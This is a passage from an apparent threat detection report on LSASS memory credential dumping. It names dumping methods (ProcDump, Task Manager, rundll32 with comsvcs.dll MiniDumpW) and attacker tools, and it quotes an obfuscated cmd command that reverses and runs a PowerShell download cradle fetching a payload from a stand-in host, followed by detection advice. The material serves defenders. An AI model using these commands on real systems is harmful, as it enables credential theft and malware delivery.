@@ -1,0 +1,126 @@
+Analysis
+Why do adversaries use
+LSASS Memory?
+Adversaries commonly abuse the Local Security Authority Subsystem Service
+(LSASS) to dump credentials for privilege escalation, data theft, and lateral
+movement. The process is a juicy target for adversaries because of the sheer
+amount of sensitive information it stores in memory. Upon starting up, LSASS
+contains valuable authentication data such as:
+      - encrypted passwords
+
+
+      - NT hashes
+
+
+      - LM hashes
+
+
+      - Kerberos tickets
+
+While there are a lot of different tools and techniques to abuse the LSASS
+process, adversaries will typically target this process first to obtain credentials.
+Post-exploitation frameworks like Cobalt Strike import and customize existing
+code from credential theft tools like Mimikatz that allow operators to easily
+access LSASS via existing beacons.
+How do adversaries use
+LSASS Memory?
+Adversaries will use a variety of different tools to dump or scan the process
+memory space of LSASS. After establishing control over their target, adversaries
+will typically remotely transfer this dump file onto their own command and
+control (C2) server to perform an offline password attack. Tools like Mimikatz
+are typically used on the compromised host to retrieve credentials from the
+static dump file or from live process memory. With these credentials, the
+l [T1003.001: LSASS Memory]
+49
+2021 Threat Detection Report
+adversary can then laterally move throughout the environment and accomplish
+their goals.
+Over the last year, we’ve identified many different techniques leveraging LSASS.
+More often than not, adversaries drop and execute trusted administrative tools
+onto their target. The Sysinternals tool ProcDump continues to be the binary we
+observe most commonly.
+A trusted Windows process like Task Manager ~~(~~ ~~taskmgr.exe~~ ~~)~~ is capable of
+dumping arbitrary process memory if executed under a privileged user account.
+It’s as simple as right-clicking on the LSASS process and hitting “Create
+Dump File.” The Create Dump File calls the MiniDumpWriteDump function
+implemented in the following DLLs: ~~Dbghelp.dll~~ and ~~Dbgcore.dll~~ .
+Additionally, the Windows DLL Host ~~(~~ ~~rundll32.exe~~ ~~)~~ can execute the Windows
+native DLL ~~comsvcs.dll~~ ~~,~~ which exports a function called ~~MiniDumpW~~ ~~.~~ When this
+export function is called by Rundll32, adversaries can feed in a process ID such
+as LSASS and create a MiniDump file. These files are intended for developers
+to debug when applications crash and contain sensitive information like
+credentials.
+Here are some tools we’ve observed accessing LSASS with different
+implementations of Mimikatz:
+  - **[Procdump](https://attack.mitre.org/techniques/T1003/001/)** (mainly renamed usage)
+
+  - **[Task Manager](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz)** ~~(~~ ~~**taskmgr.exe**~~ ~~)~~
+
+  - **[Rundll](https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/)** ~~(~~ ~~**comsvcs.dll**~~ )
+
+  - **[Pwdump](https://www.openwall.com/passwords/windows-pwdump)**
+
+  - **[Lsassy](https://github.com/Hackndo/lsassy)**
+
+  - **[Dumpert](https://github.com/outflanknl/Dumpert)**
+
+
+      - Mimikatz
+
+
+      - Cobalt Strike
+
+  - **[Metasploit](http://offensive-security.com/metasploit-unleashed/mimikatz/)**
+
+  - **[LaZagne](https://github.com/AlessandroZ/LaZagne)**
+
+  - **[Empire](https://www.powershellempire.com/?page_id=114)**
+
+  - **[Pypykatz](https://github.com/skelsec/pypykatz)**
+
+Emerging LSASS Memory tradecraft
+Adversaries have used and abused Mimikatz for years. It leverages multiple
+different techniques to steal credentials (not just from LSASS) and has been
+rewritten in many different languages, including Python, C#, and PowerShell.
+Discovering rogue Mimikatz processes can be tricky because, since its inception,
+defenders have only had to worry about detecting compiled binaries. Nowadays,
+l [T1003.001: LSASS Memory]
+“Adversaries may attempt to access
+credential material stored in the
+process memory of the Local Security
+Authority Subsystem Service (LSASS).
+After a user logs on, the system
+generates and stores a variety of
+credential materials in LSASS process
+memory. These credential materials
+can be harvested by an administrative
+user or SYSTEM and used to conduct
+Lateral Movement using Use Alternate
+Authentication Material.”
+50
+2021 Threat Detection Report
+Mimikatz has been incorporated into post-exploitation frameworks that have
+their own evasion tactics.
+```
+        cmd /V/C”set N1=   }}{hctac};kaerb;iB$ metI
+        ekovnI;)iB$,dq$(eliFdaolnwoD.cAB${yrt{)tlm$ ni
+    dq$(hcaerof;’exe.’+Kjm$+’\’+cilbup:vne$=iB$;’963’
+
+    = Kjm$;)’@’(tilpS.’detcefni=l?php.suoici/lam/
+
+    niamod.live//:ptth’=tlm$;tneilCbeW.teN tcejbo
+    wen=cAB$ llehsrewop&&for /L %R in (265;-1;0)do
+
+    set ZR=!ZR!!N1:~%R,1!&&if %R==0 call %ZR:*ZR!=%
+
+```
+Looking at this command carefully, we can see it sets a variable named ~~N1~~ to
+a string containing a PowerShell command that is reversed. There’s a ~~For~~ loop
+that reverses this string and executes it. The PowerShell command creates a
+download cradle to download a file and invokes it via a call to ~~Invoke-Item~~ .
+While these obfuscated commands may evade simple, signature-based
+detections, analytics that look for commonly used obfuscation techniques, such
+as the presence of caret characters, can easily detect them. Layered detection
+analytics will also help. If a detection misses the obfuscated DOS commands,
+another detection may trigger on the PowerShell download cradle, the call to
+~~Invoke-Item~~ ~~,~~ or a DNS lookup to an unusual domain.
